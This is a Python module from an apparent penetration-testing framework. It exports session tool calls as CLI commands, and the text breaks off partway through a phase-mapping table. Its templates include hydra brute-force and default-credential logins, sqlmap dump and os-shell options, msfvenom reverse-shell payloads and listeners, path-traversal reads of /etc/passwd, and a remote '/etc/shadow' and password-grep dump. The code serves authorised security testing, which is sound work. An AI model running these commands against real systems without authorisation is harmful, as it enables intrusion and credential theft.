"""
Runbook Export — CLI Only
Converts a session's tool invocations into reproducible CLI commands.

This module exists EXCLUSIVELY for the CLI client. It is NOT registered
in the server's TOOL_REGISTRY and has NO API endpoint. The GUI cannot
access this functionality by design.

Architecture:
    - CLI_TEMPLATES maps tool_name → function(arguments) → shell command string
    - Tools that are pure Python (no subprocess) get a descriptive comment instead
    - export_runbook() reads a session and produces an ordered .txt file
"""
import os
import json
import shlex
from datetime import datetime
from typing import Optional, List
from pathlib import Path

from config import SESSIONS_DIR, REPORTS_DIR


# =============================================================================
# CLI COMMAND TEMPLATES
#
# Each entry maps a tool name to a function that takes the tool's argument dict
# and returns the raw CLI command string. For tools that are pure Python
# (no CLI equivalent), return a comment explaining what was done.
# =============================================================================

NMAP_ARGS = {
    "quick": "-F -sV",
    "full": "-p- -sV",
    "stealth": "-sS -F",
    "udp": "-sU --top-ports 50",
    "comprehensive": "-sV -sC -O --top-ports 1000",
}


def _nmap_scan(a):
    target = a.get("target", "TARGET")
    scan_type = a.get("scan_type", "quick")
    ports = a.get("ports")
    args = f"-p{ports} -sV" if ports else NMAP_ARGS.get(scan_type, NMAP_ARGS["quick"])
    return f"nmap {args} {shlex.quote(target)}"


def _masscan_scan(a):
    target = a.get("target", "TARGET")
    ports = a.get("ports", "1-1000")
    rate = min(a.get("rate", 1000), 10000)
    return f"masscan -p{ports} {shlex.quote(target)} --rate={rate}"


def _netcat_connect(a):
    host = a.get("host", "HOST")
    port = a.get("port", 80)
    timeout = a.get("timeout", 10)
    parts = ["nc"]
    if a.get("verbose", True):
        parts.append("-v")
    if a.get("udp"):
        parts.append("-u")
    parts.extend(["-w", str(timeout), shlex.quote(host), str(port)])
    if a.get("data"):
        return f"echo {shlex.quote(a['data'])} | {' '.join(parts)}"
    return " ".join(parts)


def _netcat_listen(a):
    port = a.get("port", 4444)
    parts = ["nc", "-lvnp", str(port)]
    if a.get("udp"):
        parts.append("-u")
    return " ".join(parts)


def _dns_lookup(a):
    domain = a.get("domain", "TARGET")
    rtype = a.get("record_type", "A")
    return f"nslookup -type={rtype} {shlex.quote(domain)}"


def _whois_lookup(a):
    return f"whois {shlex.quote(a.get('domain', 'TARGET'))}"


def _crtsh_lookup(a):
    domain = a.get("domain", "TARGET")
    return f'curl -s "https://crt.sh/?q=%.{domain}&output=json" | jq -r ".[].name_value" | sort -u'


def _subfinder_enum(a):
    domain = a.get("domain", "TARGET")
    parts = ["subfinder", "-d", shlex.quote(domain), "-silent"]
    if a.get("sources"):
        parts.extend(["-sources", a["sources"]])
    if a.get("recursive"):
        parts.append("-recursive")
    return " ".join(parts)


def _arjun_scan(a):
    url = a.get("url", "URL")
    parts = ["arjun", "-u", shlex.quote(url), "-m", a.get("method", "GET")]
    if a.get("wordlist"):
        parts.extend(["-w", a["wordlist"]])
    return " ".join(parts)


def _theharvester_search(a):
    domain = a.get("domain", "TARGET")
    sources = a.get("sources", "all")
    limit = a.get("limit", 500)
    return f"theHarvester -d {shlex.quote(domain)} -b {sources} -l {limit}"


def _shodan_search(a):
    query = a.get("query", "QUERY")
    limit = a.get("limit", 100)
    return f"shodan search --limit {limit} {shlex.quote(query)}"


def _http_headers_check(a):
    url = a.get("url", "URL")
    return f"# Python urllib — security header analysis\ncurl -sI {shlex.quote(url)}"


def _http_fetch(a):
    url = a.get("url", "URL")
    method = a.get("method", "GET")
    parts = ["curl", "-s", "-X", method]
    if a.get("headers"):
        if isinstance(a["headers"], dict):
            for k, v in a["headers"].items():
                parts.extend(["-H", f"{k}: {v}"])
    if a.get("body"):
        parts.extend(["-d", shlex.quote(a["body"])])
    if not a.get("follow_redirects", True):
        pass  # curl follows by default only with -L
    else:
        parts.append("-L")
    parts.append(shlex.quote(url))
    return " ".join(parts)


def _http_methods(a):
    url = a.get("url", "URL")
    return f"# Test allowed HTTP methods\ncurl -sI -X OPTIONS {shlex.quote(url)}"


def _cookie_check(a):
    url = a.get("url", "URL")
    return f"# Cookie security analysis\ncurl -sI -c - {shlex.quote(url)} | grep -i set-cookie"


def _http_probe(a):
    targets = a.get("targets", [])
    if isinstance(targets, str):
        targets = [targets]
    target_str = " ".join(shlex.quote(t) for t in targets)
    return f"# HTTP alive check (Python urllib)\nfor url in {target_str}; do curl -sI -o /dev/null -w \"%{{http_code}} $url\\n\" \"$url\"; done"


def _ffuf_fuzz(a):
    url = a.get("url", "URL/FUZZ")
    wordlist = a.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
    parts = ["ffuf", "-u", shlex.quote(url), "-w", wordlist, "-t", str(a.get("threads", 40)),
             "-X", a.get("method", "GET"), "-mc", "all", "-ac", "-s"]
    if a.get("extensions") and a.get("mode") == "file":
        parts.extend(["-e", a["extensions"]])
    if a.get("filter_codes"):
        parts.extend(["-fc", a["filter_codes"]])
    return " ".join(parts)


def _katana_crawl(a):
    targets = a.get("targets", [])
    if isinstance(targets, str):
        targets = [targets]
    depth = a.get("depth", 3)
    parts = ["katana", "-u", ",".join(targets), "-d", str(depth), "-silent"]
    if a.get("js_crawl", True):
        parts.append("-jc")
    if a.get("headless"):
        parts.append("-headless")
    return " ".join(parts)


def _waybackurls_fetch(a):
    domain = a.get("domain", "TARGET")
    parts = ["waybackurls", shlex.quote(domain)]
    if a.get("no_subs"):
        parts.append("--no-subs")
    return " ".join(parts)


def _nikto_scan(a):
    target = a.get("target", "TARGET")
    maxtime = a.get("maxtime", 600)
    parts = ["nikto", "-h", shlex.quote(target), "-maxtime", f"{maxtime}s"]
    if a.get("port"):
        parts.extend(["-p", str(a["port"])])
    if a.get("ssl"):
        parts.append("-ssl")
    if a.get("plugins"):
        parts.extend(["-Plugins", a["plugins"]])
    if a.get("tuning"):
        parts.extend(["-Tuning", a["tuning"]])
    return " ".join(parts)


def _enum4linux_scan(a):
    target = a.get("target", "TARGET")
    parts = ["enum4linux-ng"]
    if a.get("username"):
        parts.extend(["-u", a["username"]])
    if a.get("password"):
        parts.extend(["-p", a["password"]])
    if a.get("detailed") or a.get("all_enum", True):
        parts.append("-A")
    parts.append(shlex.quote(target))
    return " ".join(parts)


def _testssl_scan(a):
    target = a.get("target", "TARGET")
    port = a.get("port", 443)
    parts = ["testssl.sh"]
    if a.get("full"):
        parts.append("--full")
    else:
        if a.get("protocols", True):
            parts.append("-p")
        if a.get("ciphers", True):
            parts.append("-E")
        if a.get("vulnerabilities", True):
            parts.append("-U")
        if a.get("headers", True):
            parts.append("-h")
    parts.extend(["--severity", a.get("severity", "LOW"), "--color", "0"])
    parts.append(f"{target}:{port}")
    return " ".join(parts)


def _smbclient_list(a):
    target = a.get("target", "TARGET")
    share = a.get("share")
    if share:
        parts = ["smbclient", f"//{target}/{share}"]
    else:
        parts = ["smbclient", "-L", target]
    if a.get("username"):
        user = a["username"]
        pw = a.get("password", "")
        domain = a.get("domain")
        if domain:
            parts.extend(["-U", f"{domain}\\{user}%{pw}"])
        else:
            parts.extend(["-U", f"{user}%{pw}"])
    else:
        parts.append("-N")
    if share:
        parts.extend(["-c", "ls"])
    return " ".join(parts)


def _feroxbuster_scan(a):
    url = a.get("url", "URL")
    wordlist = a.get("wordlist", "/usr/share/seclists/Discovery/Web-Content/common.txt")
    parts = ["feroxbuster", "-u", shlex.quote(url), "-w", wordlist,
             "-t", str(a.get("threads", 50)), "-d", str(a.get("depth", 2)),
             "-s", a.get("status_codes", "200,204,301,302,307,401,403,405"),
             "--no-state", "-q"]
    if a.get("extensions"):
        parts.extend(["-x", a["extensions"]])
    return " ".join(parts)


def _gobuster_dir(a):
    url = a.get("url", "URL")
    wordlist = a.get("wordlist", "/usr/share/seclists/Discovery/Web-Content/common.txt")
    parts = ["gobuster", "dir", "-u", shlex.quote(url), "-w", wordlist,
             "-t", str(a.get("threads", 50)),
             "-s", a.get("status_codes", "200,204,301,302,307,401,403"),
             "-q", "--no-progress"]
    if a.get("extensions"):
        parts.extend(["-x", a["extensions"]])
    return " ".join(parts)


def _nuclei_scan(a):
    target = a.get("target", "TARGET")
    parts = ["nuclei", "-u", shlex.quote(target), "-silent", "-nc"]
    if a.get("tags"):
        tags = a["tags"] if isinstance(a["tags"], str) else ",".join(a["tags"])
        parts.extend(["-tags", tags])
    if a.get("severity"):
        parts.extend(["-severity", a["severity"].lower()])
    if a.get("templates"):
        templates = a["templates"] if isinstance(a["templates"], str) else ",".join(a["templates"])
        parts.extend(["-t", templates])
    return " ".join(parts)


def _sqlmap_scan(a):
    url = a.get("url", "URL")
    parts = ["sqlmap", "-u", shlex.quote(url), "--batch",
             "--level", str(a.get("level", 1)),
             "--risk", str(a.get("risk", 1)),
             "--threads", str(a.get("threads", 1))]
    if a.get("random_agent", True):
        parts.append("--random-agent")
    if a.get("data"):
        parts.extend(["--data", shlex.quote(a["data"])])
    if a.get("technique"):
        parts.extend(["--technique", a["technique"].upper()])
    if a.get("tamper"):
        parts.extend(["--tamper", a["tamper"]])
    if a.get("dbms"):
        parts.extend(["--dbms", a["dbms"]])
    if a.get("cookie"):
        parts.extend(["--cookie", shlex.quote(a["cookie"])])
    if a.get("dbs"):
        parts.append("--dbs")
    if a.get("tables"):
        parts.append("--tables")
    if a.get("dump"):
        parts.append("--dump")
    if a.get("current_user"):
        parts.append("--current-user")
    if a.get("current_db"):
        parts.append("--current-db")
    if a.get("passwords"):
        parts.append("--passwords")
    if a.get("os_shell"):
        parts.append("--os-shell")
    if a.get("forms"):
        parts.append("--forms")
    if a.get("crawl", 0) > 0:
        parts.extend(["--crawl", str(a["crawl"])])
    return " ".join(parts)


def _commix_scan(a):
    url = a.get("url", "URL")
    parts = ["commix", "--url", shlex.quote(url), "--batch",
             "--level", str(a.get("level", 1))]
    if a.get("data"):
        parts.extend(["--data", shlex.quote(a["data"])])
    if a.get("cookie"):
        parts.extend(["--cookie", shlex.quote(a["cookie"])])
    if a.get("os_cmd"):
        parts.extend(["--os-cmd", shlex.quote(a["os_cmd"])])
    return " ".join(parts)


def _sslscan_check(a):
    target = a.get("target", "TARGET")
    port = a.get("port", 443)
    return f"sslscan --no-colour {target}:{port}"


def _credential_test(a):
    target = a.get("target", "TARGET")
    service = a.get("service", "ssh")
    parts = ["hydra"]
    if a.get("username"):
        parts.extend(["-l", a["username"]])
    elif a.get("username_list"):
        parts.extend(["-L", a["username_list"]])
    else:
        parts.extend(["-l", "admin"])
    if a.get("password"):
        parts.extend(["-p", a["password"]])
    else:
        parts.extend(["-P", a.get("password_list", "/usr/share/wordlists/passwords/top-1000.txt")])
    parts.extend(["-t", str(min(a.get("threads", 4), 16)), "-f"])
    if a.get("port"):
        parts.extend(["-s", str(a["port"])])
    parts.extend([shlex.quote(target), service])
    if a.get("additional_args"):
        parts.append(a["additional_args"])
    return " ".join(parts)


def _default_creds_check(a):
    target = a.get("target", "TARGET")
    service = a.get("service", "ssh")
    port_flag = f" -s {a['port']}" if a.get("port") else ""
    return (f"# Test common default credentials against {service}://{target}\n"
            f"hydra -l admin -p admin -t 1 -w 10 -f{port_flag} {shlex.quote(target)} {service}\n"
            f"hydra -l root -p root -t 1 -w 10 -f{port_flag} {shlex.quote(target)} {service}\n"
            f"hydra -l root -p toor -t 1 -w 10 -f{port_flag} {shlex.quote(target)} {service}\n"
            f"# ... (14 more default pairs tested)")


def _wpscan_scan(a):
    url = a.get("url", "URL")
    parts = ["wpscan", "--url", shlex.quote(url), "--no-banner"]
    enum = a.get("enumerate", ["vp", "vt", "tt", "cb", "dbe", "u"])
    if isinstance(enum, list):
        parts.extend(["-e", ",".join(enum)])
    if a.get("detection_mode"):
        parts.extend(["--detection-mode", a["detection_mode"]])
    if a.get("random_user_agent", True):
        parts.append("--random-user-agent")
    if a.get("force"):
        parts.append("--force")
    if a.get("disable_tls_checks"):
        parts.append("--disable-tls-checks")
    return " ".join(parts)


def _searchsploit_search(a):
    query = a.get("query", "QUERY")
    parts = ["searchsploit"]
    if a.get("exact"):
        parts.append("-e")
    if a.get("exclude"):
        parts.extend(["--exclude", a["exclude"]])
    parts.append(shlex.quote(query))
    return " ".join(parts)


def _searchsploit_examine(a):
    return f"searchsploit -x {a.get('exploit_id', 'EDB-ID')}"


def _searchsploit_mirror(a):
    return f"searchsploit -m {a.get('exploit_id', 'EDB-ID')} -d {a.get('output_dir', '/tmp')}"


def _msfconsole_run(a):
    if a.get("resource_script"):
        return f"msfconsole -q -r {a['resource_script']}"
    if a.get("execute_cmd"):
        return f"msfconsole -q -x {shlex.quote(a['execute_cmd'])}"
    if a.get("module") and a.get("options"):
        cmds = [f"use {a['module']}"]
        for k, v in a["options"].items():
            cmds.append(f"set {k} {v}")
        cmds.extend(["run", "exit"])
        return f"msfconsole -q -x {shlex.quote('; '.join(cmds))}"
    return "# msfconsole (insufficient params to reconstruct)"


def _msfvenom_generate(a):
    payload = a.get("payload", "PAYLOAD")
    lhost = a.get("lhost", "LHOST")
    lport = a.get("lport", 4444)
    fmt = a.get("format", "raw")
    parts = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt]
    if a.get("encoder"):
        parts.extend(["-e", a["encoder"], "-i", str(a.get("iterations", 1))])
    if a.get("platform"):
        parts.extend(["--platform", a["platform"]])
    if a.get("arch"):
        parts.extend(["-a", a["arch"]])
    if a.get("outfile"):
        parts.extend(["-o", a["outfile"]])
    return " ".join(parts)


# --- MSF RPC tool CLI reconstructions ---

def _msf_run_exploit_cli(a):
    mod = a.get("module", "MODULE")
    if not mod.startswith("exploit/"):
        mod = f"exploit/{mod}" if "/" in mod else mod
    cmds = [f"use {mod}"]
    for k, v in (a.get("options") or {}).items():
        cmds.append(f"set {k} {v}")
    if a.get("payload"):
        p = a["payload"]
        if p.startswith("payload/"):
            p = p[len("payload/"):]
        cmds.append(f"set PAYLOAD {p}")
    for k, v in (a.get("payload_options") or {}).items():
        cmds.append(f"set {k} {v}")
    if a.get("check_first"):
        cmds.append("check")
    cmds.append("exploit")
    return f"msfconsole -q -x {shlex.quote('; '.join(cmds))}"


def _msf_run_auxiliary_cli(a):
    mod = a.get("module", "MODULE")
    if not mod.startswith("auxiliary/"):
        mod = f"auxiliary/{mod}" if "/" in mod else mod
    cmds = [f"use {mod}"]
    for k, v in (a.get("options") or {}).items():
        cmds.append(f"set {k} {v}")
    cmds.append("run")
    return f"msfconsole -q -x {shlex.quote('; '.join(cmds))}"


def _msf_run_post_cli(a):
    mod = a.get("module", "MODULE")
    if not mod.startswith("post/"):
        mod = f"post/{mod}" if "/" in mod else mod
    sid = a.get("session_id", "SESSION_ID")
    cmds = [f"use {mod}", f"set SESSION {sid}"]
    for k, v in (a.get("options") or {}).items():
        cmds.append(f"set {k} {v}")
    cmds.append("run")
    return f"msfconsole -q -x {shlex.quote('; '.join(cmds))}"


def _msf_start_listener_cli(a):
    payload = a.get("payload", "PAYLOAD")
    if payload.startswith("payload/"):
        payload = payload[len("payload/"):]
    lhost = a.get("lhost", "LHOST")
    lport = a.get("lport", 4444)
    cmds = [
        "use exploit/multi/handler",
        f"set PAYLOAD {payload}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
    ]
    eos = a.get("exit_on_session", False)
    cmds.append(f"set ExitOnSession {'true' if eos else 'false'}")
    for k, v in (a.get("options") or {}).items():
        cmds.append(f"set {k} {v}")
    cmds.append("exploit -j -z")
    return f"msfconsole -q -x {shlex.quote('; '.join(cmds))}"


def _msf_generate_payload_cli(a):
    payload = a.get("payload", "PAYLOAD")
    fmt = a.get("format", "raw")
    opts = a.get("options") or {}
    lhost = opts.get("LHOST", "LHOST")
    lport = opts.get("LPORT", 4444)
    parts = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt]
    if a.get("encoder"):
        parts.extend(["-e", a["encoder"], "-i", str(a.get("iterations", 1))])
    if a.get("outfile"):
        parts.extend(["-o", a["outfile"]])
    return " ".join(parts)


def _zap_baseline_scan(a):
    target = a.get("target", "TARGET")
    parts = ["zap-baseline.py", "-t", shlex.quote(target), "-m", str(a.get("minutes", 1))]
    if a.get("ajax_spider"):
        parts.append("-j")
    return " ".join(parts)


def _zap_full_scan(a):
    target = a.get("target", "TARGET")
    parts = ["zap-full-scan.py", "-t", shlex.quote(target), "-m", str(a.get("minutes", 5))]
    if a.get("ajax_spider"):
        parts.append("-j")
    return " ".join(parts)


def _zap_api_scan(a):
    target = a.get("target", "TARGET")
    parts = ["zap-api-scan.py", "-t", shlex.quote(target), "-f", a.get("api_format", "openapi")]
    if a.get("safe_mode", True):
        parts.append("-S")
    return " ".join(parts)


# ZAP API tool CLI reconstructions (using zap-cli / curl equivalents)
def _zap_api_curl(endpoint, params=""):
    """Helper: ZAP REST API → curl equivalent."""
    return f"curl -s 'http://127.0.0.1:8080/JSON/{endpoint}/?{params}'"


def _postexploit_system_info(a):
    target = a.get("target", "TARGET")
    user = a.get("username", "USER")
    port = a.get("port", 22)
    return (f"sshpass -p '***' ssh -o StrictHostKeyChecking=no -p {port} {user}@{target} "
            f"'uname -a; id; cat /etc/os-release; df -h; free -h; ps aux; netstat -tlnp; ip a'")


def _postexploit_privesc_check(a):
    target = a.get("target", "TARGET")
    user = a.get("username", "USER")
    port = a.get("port", 22)
    return (f"# Upload and run LinPEAS for privilege escalation checks\n"
            f"sshpass -p '***' scp -P {port} linpeas.sh {user}@{target}:/tmp/\n"
            f"sshpass -p '***' ssh -p {port} {user}@{target} 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh -q'")


def _postexploit_read_file(a):
    target = a.get("target", "TARGET")
    user = a.get("username", "USER")
    filepath = a.get("filepath", "/etc/passwd")
    port = a.get("port", 22)
    return f"sshpass -p '***' ssh -p {port} {user}@{target} 'cat {filepath}'"


def _postexploit_credential_dump(a):
    target = a.get("target", "TARGET")
    user = a.get("username", "USER")
    port = a.get("port", 22)
    return (f"sshpass -p '***' ssh -p {port} {user}@{target} "
            f"'cat /etc/shadow; cat /etc/passwd; find / -name *.conf -exec grep -l pass {{}} \\;'")


def _postexploit_internal_scan(a):
    target = a.get("target", "TARGET")
    user = a.get("username", "USER")
    port = a.get("port", 22)
    scan_range = a.get("scan_range", "")
    cmd = f"sshpass -p '***' ssh -p {port} {user}@{target} 'ip a; arp -a; netstat -tlnp"
    if scan_range:
        cmd += f"; for i in $(seq 1 254); do ping -c1 -W1 {scan_range}.$i; done"
    cmd += "'"
    return cmd


def _verify_sqli(a):
    url = a.get("url", "URL")
    level = a.get("level", 2)
    risk = a.get("risk", 2)
    return f"sqlmap -u {shlex.quote(url)} --batch --level {level} --risk {risk} --dbs --threads 4"


def _verify_rce(a):
    url = a.get("url", "URL")
    parts = ["commix", "--url", shlex.quote(url), "--batch", "--os-cmd", '"id;whoami;hostname"']
    if a.get("data"):
        parts.extend(["--data", shlex.quote(a["data"])])
    return " ".join(parts)


def _verify_lfi(a):
    url = a.get("url", "URL")
    param = a.get("parameter", "file")
    return (f"# LFI verification — test path traversal payloads\n"
            f"curl -s {shlex.quote(url + '?' + param + '=../../../etc/passwd')}\n"
            f"curl -s {shlex.quote(url + '?' + param + '=....//....//....//etc/passwd')}")


def _verify_default_creds(a):
    return _default_creds_check(a)


def _verify_cve(a):
    target = a.get("target", "TARGET")
    cve = a.get("cve_id", "CVE-XXXX-XXXXX")
    return (f"searchsploit -j {shlex.quote(cve)}\n"
            f"nuclei -u {shlex.quote(target)} -tags {cve.lower().replace('-', '_')} -silent -nc")


# Python-only tools — no CLI equivalent, describe what happened
def _python_only(description):
    def _template(a):
        target = a.get("url") or a.get("host") or a.get("target") or a.get("domain") or "target"
        return f"# {description} — target: {target}\n# (Python-only operation, no direct CLI equivalent)"
    return _template


def _state_only(description):
    def _template(a):
        return f"# {description}\n# (Internal state management, no CLI command)"
    return _template


# =============================================================================
# MASTER TEMPLATE MAP
# =============================================================================

CLI_TEMPLATES = {
    # Network
    "nmap_scan": _nmap_scan,
    "masscan_scan": _masscan_scan,
    "netcat_connect": _netcat_connect,
    "netcat_listen": _netcat_listen,

    # DNS
    "dns_lookup": _dns_lookup,
    "whois_lookup": _whois_lookup,
    "crtsh_lookup": _crtsh_lookup,

    # Recon
    "subfinder_enum": _subfinder_enum,
    "arjun_scan": _arjun_scan,

    # OSINT
    "theharvester_search": _theharvester_search,
    "shodan_search": _shodan_search,
    "email_harvest": _python_only("Email harvesting from public sources (PGP, GitHub, website scraping)"),

    # Web
    "http_probe": _http_probe,
    "http_headers_check": _http_headers_check,
    "http_fetch": _http_fetch,
    "http_methods": _http_methods,
    "cookie_check": _cookie_check,
    "ffuf_fuzz": _ffuf_fuzz,
    "katana_crawl": _katana_crawl,
    "waybackurls_fetch": _waybackurls_fetch,

    # Enumeration
    "nikto_scan": _nikto_scan,
    "enum4linux_scan": _enum4linux_scan,
    "testssl_scan": _testssl_scan,
    "smbclient_list": _smbclient_list,

    # Brute-force
    "feroxbuster_scan": _feroxbuster_scan,
    "gobuster_dir": _gobuster_dir,

    # Credentials
    "credential_test": _credential_test,
    "default_creds_check": _default_creds_check,

    # Vulnerability
    "nuclei_scan": _nuclei_scan,
    "sqlmap_scan": _sqlmap_scan,
    "sqli_payloads": _python_only("SQL injection payload generation (cheat sheet)"),

    # Injection
    "commix_scan": _commix_scan,
    "sslscan_check": _sslscan_check,

    # WordPress
    "wpscan_scan": _wpscan_scan,

    # Exploitation
    "searchsploit_search": _searchsploit_search,
    "searchsploit_examine": _searchsploit_examine,
    "searchsploit_mirror": _searchsploit_mirror,
    "msfconsole_run": _msfconsole_run,
    "msfvenom_generate": _msfvenom_generate,

    # Metasploit RPC tools (map to equivalent CLI commands)
    "msf_list_exploits": lambda a: f"msfconsole -q -x {shlex.quote('search type:exploit ' + a.get('search_term', ''))}",
    "msf_list_payloads": lambda a: f"msfconsole -q -x {shlex.quote('search type:payload ' + ' '.join(filter(None, [a.get('platform', ''), a.get('arch', '')])))}",
    "msf_search_modules": lambda a: f"msfconsole -q -x {shlex.quote('search ' + (('type:' + a['module_type'] + ' ') if a.get('module_type') else '') + a.get('search_term', ''))}",
    "msf_module_info": lambda a: f"msfconsole -q -x {shlex.quote('info ' + a.get('module_path', ''))}",
    "msf_run_exploit": lambda a: _msf_run_exploit_cli(a),
    "msf_run_auxiliary": lambda a: _msf_run_auxiliary_cli(a),
    "msf_run_post": lambda a: _msf_run_post_cli(a),
    "msf_list_sessions": lambda a: "msfconsole -q -x 'sessions -l'",
    "msf_session_command": lambda a: f"msfconsole -q -x {shlex.quote('sessions -i ' + str(a.get('session_id', '')) + ' -c ' + shlex.quote(a.get('command', '')))}",
    "msf_terminate_session": lambda a: f"msfconsole -q -x {shlex.quote('sessions -k ' + str(a.get('session_id', '')))}",
    "msf_start_listener": lambda a: _msf_start_listener_cli(a),
    "msf_list_jobs": lambda a: "msfconsole -q -x 'jobs -l'",
    "msf_stop_job": lambda a: f"msfconsole -q -x {shlex.quote('jobs -k ' + str(a.get('job_id', '')))}",
    "msf_generate_payload": lambda a: _msf_generate_payload_cli(a),

    # ZAP
    "zap_baseline_scan": _zap_baseline_scan,
    "zap_full_scan": _zap_full_scan,
    "zap_api_scan": _zap_api_scan,

    # ZAP API tools
    "zap_create_context": lambda a: _zap_api_curl(f"context/action/newContext", f"contextName={a.get('name', 'ctx')}"),
    "zap_list_contexts": lambda a: _zap_api_curl("context/view/contextList"),
    "zap_spider": lambda a: _zap_api_curl("spider/action/scan", f"url={a.get('target', 'TARGET')}"),
    "zap_spider_status": lambda a: _zap_api_curl("spider/view/status", f"scanId={a.get('scan_id', '0')}"),
    "zap_stop_spider": lambda a: _zap_api_curl("spider/action/stop", f"scanId={a.get('scan_id', '0')}"),
    "zap_ajax_spider_status": lambda a: _zap_api_curl("ajaxSpider/view/status"),
    "zap_stop_ajax_spider": lambda a: _zap_api_curl("ajaxSpider/action/stop"),
    "zap_active_scan": lambda a: _zap_api_curl("ascan/action/scan", f"url={a.get('target', 'TARGET')}"),
    "zap_scan_status": lambda a: _zap_api_curl("ascan/view/status", f"scanId={a.get('scan_id', '0')}"),
    "zap_stop_scan": lambda a: _zap_api_curl("ascan/action/stop", f"scanId={a.get('scan_id', '0')}"),
    "zap_passive_scan_status": lambda a: _zap_api_curl("pscan/view/recordsToScan"),
    "zap_get_alerts": lambda a: _zap_api_curl("core/view/alerts", f"baseurl={a.get('target', '')}&start=0&count=100"),
    "zap_alert_detail": lambda a: _zap_api_curl("core/view/alert", f"id={a.get('alert_id', '0')}"),
    "zap_get_sites": lambda a: _zap_api_curl("core/view/sites"),
    "zap_get_urls": lambda a: _zap_api_curl("core/view/urls", f"baseurl={a.get('target', '')}"),
    "zap_get_history": lambda a: _zap_api_curl("core/view/messages", f"start=0&count=50"),
    "zap_generate_report": lambda a: _zap_api_curl("reports/action/generate", f"title={a.get('title', 'Report')}&template={a.get('template', 'traditional-html')}"),
    "zap_list_scan_policies": lambda a: _zap_api_curl("ascan/view/scanPolicyNames"),
    "zap_new_session": lambda a: _zap_api_curl("core/action/newSession", f"overwrite=true"),
    "zap_access_url": lambda a: _zap_api_curl("core/action/accessUrl", f"url={a.get('url', 'URL')}"),

    # Burp Suite Professional (REST API on port 1337)
    "burp_check_connection": lambda a: f"curl -s http://127.0.0.1:1337/v0.1/",
    "burp_start_scan": lambda a: (
        "curl -s -X POST http://127.0.0.1:1337/v0.1/scan "
        "-H 'Content-Type: application/json' "
        "-d '{\"urls\": " + json.dumps(a.get("target_urls", ["TARGET"])) + "}'"
    ),
    "burp_scan_status": lambda a: f"curl -s http://127.0.0.1:1337/v0.1/scan/{a.get('task_id', 'TASK_ID')}",
    "burp_scan_issues": lambda a: f"curl -s http://127.0.0.1:1337/v0.1/scan/{a.get('task_id', 'TASK_ID')} | python3 -m json.tool",
    "burp_cancel_scan": lambda a: f"curl -s -X DELETE http://127.0.0.1:1337/v0.1/scan/{a.get('task_id', 'TASK_ID')}",
    "burp_issue_definitions": lambda a: "curl -s http://127.0.0.1:1337/v0.1/knowledge_base/issue_definitions | python3 -m json.tool",
    "burp_scan_configs": lambda a: "curl -s http://127.0.0.1:1337/v0.1/scan/configs | python3 -m json.tool",

    # Post-exploitation
    "postexploit_system_info": _postexploit_system_info,
    "postexploit_privesc_check": _postexploit_privesc_check,
    "postexploit_read_file": _postexploit_read_file,
    "postexploit_credential_dump": _postexploit_credential_dump,
    "postexploit_internal_scan": _postexploit_internal_scan,

    # Verification
    "verify_sqli": _verify_sqli,
    "verify_rce": _verify_rce,
    "verify_lfi": _verify_lfi,
    "verify_default_creds": _verify_default_creds,
    "verify_cve": _verify_cve,

    # API Security
    "jwt_test": _python_only("JWT analysis and attack testing (alg:none, HMAC brute-force)"),
    "graphql_test": _python_only("GraphQL introspection and security analysis"),

    # Auth
    "auth_login": _python_only("Authenticated session login via HTTP"),
    "auth_set_token": _state_only("Set authentication token for target"),
    "auth_headers": _state_only("Retrieve stored auth headers"),
    "auth_test": _python_only("Test stored authentication against target"),
    "auth_clear": _state_only("Clear stored auth credentials"),

    # Target state
    "target_add": _state_only("Add target to state tracker"),
    "target_add_port": _state_only("Record discovered port"),
    "target_add_credential": _state_only("Record discovered credential"),
    "target_add_vuln": _state_only("Record discovered vulnerability"),
    "target_log_scan": _state_only("Log scan activity for target"),
    "target_get": _state_only("Retrieve target state"),
    "target_list": _state_only("List all tracked targets"),
    "target_clear": _state_only("Clear target state"),

    # Attack surface
    "attack_surface_map": _state_only("Render attack surface map"),

    # Evidence
    "evidence_capture": _state_only("Capture evidence to file"),
    "evidence_list": _state_only("List captured evidence"),
    "evidence_get": _state_only("Retrieve evidence file"),
    "evidence_clear": _state_only("Clear evidence directory"),

    # Reporting
    "report_add_finding": _state_only("Add finding to report"),
    "report_list_findings": _state_only("List report findings"),
    "report_clear_findings": _state_only("Clear report findings"),
    "report_import_evidence": _state_only("Import evidence into report"),
    "report_generate": _state_only("Generate assessment report"),

    # Sessions
    "session_create": _state_only("Create interactive tool session"),
    "session_exec": _state_only("Execute command in interactive session"),
    "session_read": _state_only("Read interactive session output"),
    "session_close": _state_only("Close interactive session"),
    "session_list": _state_only("List active sessions"),
    "session_history": _state_only("Session command history"),


}


# =============================================================================
# PHASE CLASSIFICATION
# =============================================================================

PHASE_MAP = {
    # Recon
    "dns_lookup": "Reconnaissance",
    "whois_lookup": "Reconnaissance",
    "crtsh_lookup": "Reconnaissance",
    "subfinder_enum": "Reconnaissance",
    "theharvester_search": "Reconnaissance",
    "shodan_search": "Reconnaissance",
    "email_harvest": "Reconnaissance",
    "waybackurls_fetch": "Reconnaissance",

    # Enumeration
    "nmap_scan": "Enumeration",
    "masscan_scan": "Enumeration",
    "http_probe": "Enumeration",
    "http_headers_check": "Enumeration",
    "http_methods": "Enumeration",
    "nikto_scan": "Enumeration",
    "enum4linux_scan": "Enumeration",
    "testssl_scan": "Enumeration",
    "sslscan_check": "Enumeration",
    "smbclient_list": "Enumeration",
    "wpscan_scan": "Enumeration",
    "katana_crawl": "Enumeration",
    "arjun_scan": "Enumeration",
    "cookie_check": "Enumeration",

    # Discovery
    "feroxbuster_scan": "Discovery",
    "gobuster_dir": "Discovery",
    "ffuf_fuzz": "Discovery",
    "http_fetch": "Discovery",

    # Vulnerability Assessment
    "nuclei_scan": "Vulnerability Assessment",
    "sqlmap_scan": "Vulnerability Assessment",
    "sqli_payloads": "Vulnerability Assessment",
    "commix_scan": "Vulnerability Assessment",
    "jwt_test": "Vulnerability Assessment",
    "graphql_test": "Vulnerability Assessment",
    "zap_baseline_scan": "Vulnerability Assessment",
    "zap_full_scan": "Vulnerability Assessment",
    "zap_api_scan": "Vulnerability Assessment",
    "zap_create_context": "Discovery",
    "zap_list_contexts": "Discovery",
    "zap_spider": "Discovery",
    "zap_spider_status": "Discovery",
    "zap_stop_spider": "Discovery",
